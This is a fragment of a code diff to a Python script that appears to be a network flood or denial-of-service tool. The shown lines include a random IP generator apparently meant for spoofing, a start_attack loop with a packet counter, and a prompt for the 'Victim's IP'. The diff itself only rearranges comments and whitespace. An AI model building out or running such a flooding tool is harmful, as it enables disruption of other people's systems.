@@ -4,15 +4,15 @@ import threading
 
 packet_num = 0
 
-
+# Random IP generator
 def get_proxy():
             fake = ""
-            # Random IP generator
             for i in range(4):
                 fake += str(random.randint(0, 255))
                 fake += "." if i != 3 else ""
             return fake
 
+# Attack method
 def start_attack():
     global packet_num
     while True:
@@ -34,6 +34,7 @@ def start_attack():
         except:
             print("[answer] >> An error occured!")
             break
+
 
 try:
     target = input("Victim's IP (or domain name) >> ")
